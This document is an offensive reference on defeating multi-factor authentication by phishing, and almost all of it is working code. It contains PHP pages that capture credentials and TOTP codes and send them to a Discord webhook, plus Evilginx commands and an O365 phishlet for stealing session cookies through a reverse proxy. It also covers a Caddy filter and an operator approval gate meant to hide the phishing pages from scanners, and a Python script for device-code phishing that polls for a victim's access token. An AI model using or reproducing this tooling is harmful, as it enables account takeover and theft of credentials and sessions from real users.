# MFA Bypass & Access Gating Reference

## Manual TOTP Harvesting

### Concept
Capture the user's credentials on a fake login page, then present a fake MFA page to capture their TOTP code. Use the captured credentials + TOTP in real-time to authenticate to the legitimate service.

### Flow: login.php → mfa_landing.php → mfa.php

**login.php** - Credential capture page (form posts to `index.php`):
```php
<?php
session_start();
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    file_put_contents('/var/www/creds.txt', "User: $username | Pass: $password\n", FILE_APPEND);
    $_SESSION['username'] = $username;
    header('Location: mfa_landing.php');
    exit();
}
?>
<!-- Login form HTML here -->
```

**mfa_landing.php** - Loading screen with redirect:
```php
<?php session_start(); ?>
<h2>Verifying identity...</h2>
<script>setTimeout(function(){ window.location = 'mfa.php'; }, 3000);</script>
```

**mfa.php** - MFA code capture:
```php
<?php
session_start();
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $code = $_POST['mfa_code'];
    $username = $_SESSION['username'];
    file_put_contents('/var/www/mfa_codes.txt', "User: $username | Code: $code | Time: " . date('H:i:s') . "\n", FILE_APPEND);
    header('Location: https://google.com');
    exit();
}
?>
<form method="POST">
    <input type="text" name="mfa_code" placeholder="Enter verification code" maxlength="6" required>
    <button type="submit">Verify</button>
</form>
```

### Discord Notification Variant
Send credentials to Discord channel for real-time alerting:
```php
<?php
function notifyDiscord($message) {
    $webhook = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL';
    $data = json_encode(['content' => $message]);
    $ch = curl_init($webhook);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}
notifyDiscord("New creds: $username:$password");
?>
```

---

## AITM (Adversary-in-the-Middle) Via Reverse Proxy

### Concept
Instead of capturing and replaying credentials manually, use a reverse proxy that sits between the victim and the legitimate service. The proxy transparently forwards all traffic, capturing session cookies in the process. This bypasses MFA entirely because the user completes MFA against the real service through the proxy.

### Evilginx Setup
```bash
./evilginx

config domain yourdomain.com
config ipv4 YOUR_SERVER_IP

phishlets hostname o365 login.yourdomain.com
phishlets enable o365

lures create o365
lures get-url 0
```

### O365 Phishlet (YAML)
```yaml
name: 'o365'
proxy_hosts:
  - phish_sub: 'login'
    orig_sub: 'login'
    domain: 'microsoftonline.com'
    session: true
    is_landing: true
auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
```

### Opsec: Protect Evilginx with Caddy
Place Caddy in front of Evilginx as a filter:
```
login.yourdomain.com {
    @blocked_ips { remote_ip 192.168.0.0/16 }
    handle @blocked_ips { respond "Forbidden" 403 }

    reverse_proxy https://localhost:8443 {
        transport http { tls_insecure_skip_verify }
    }
}
```

---

## Email/Push/Discord Approval Gates

### Concept
Before showing phishing content, require the operator to approve each visitor. This prevents automated scanners from seeing the phishing page.

### PHP: Approval System
**landing.php** (visitor waits):
```php
<?php
session_start();
$_SESSION['visitor_id'] = bin2hex(random_bytes(8));
$_SESSION['approved'] = false;
file_put_contents('/var/www/pending.txt', $_SESSION['visitor_id'] . '|' . $_SERVER['REMOTE_ADDR'] . "\n", FILE_APPEND);
?>
<h2>Loading...</h2>
<script>
setInterval(function() {
    fetch('check_approval.php').then(r => r.json()).then(d => {
        if (d.approved) window.location = 'login.php';
        if (d.declined) window.location = 'https://google.com';
    });
}, 3000);
</script>
```

**approve.php** (operator approves):
```php
<?php
$id = $_GET['id'];
file_put_contents('/var/www/approved.txt', $id . "\n", FILE_APPEND);
echo "Approved: $id";
?>
```

**check_approval.php** (visitor polls):
```php
<?php
session_start();
$id = $_SESSION['visitor_id'];
$approved = in_array($id, file('/var/www/approved.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
$declined = in_array($id, file('/var/www/declined.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
echo json_encode(['approved' => $approved, 'declined' => $declined]);
?>
```

---

## Device Code Phishing

### Microsoft Device Code Flow
1. Request a device code from Microsoft's OAuth endpoint
2. Present the code to the victim ("Enter this code at microsoft.com/devicelogin")
3. Victim enters code and authenticates
4. Attacker polls for the access token

```python
import requests, time

tenant_id = 'common'
client_id = 'YOUR_APP_CLIENT_ID'

r = requests.post(f'https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/devicecode', data={
    'client_id': client_id,
    'scope': 'https://graph.microsoft.com/.default'
})
data = r.json()
print(f"Go to: {data['verification_uri']}")
print(f"Enter code: {data['user_code']}")

while True:
    time.sleep(data['interval'])
    token_r = requests.post(f'https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token', data={
        'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
        'client_id': client_id,
        'device_code': data['device_code']
    })
    if 'access_token' in token_r.json():
        print("Got token:", token_r.json()['access_token'])
        break
    elif token_r.json().get('error') != 'authorization_pending':
        print("Error:", token_r.json())
        break
```
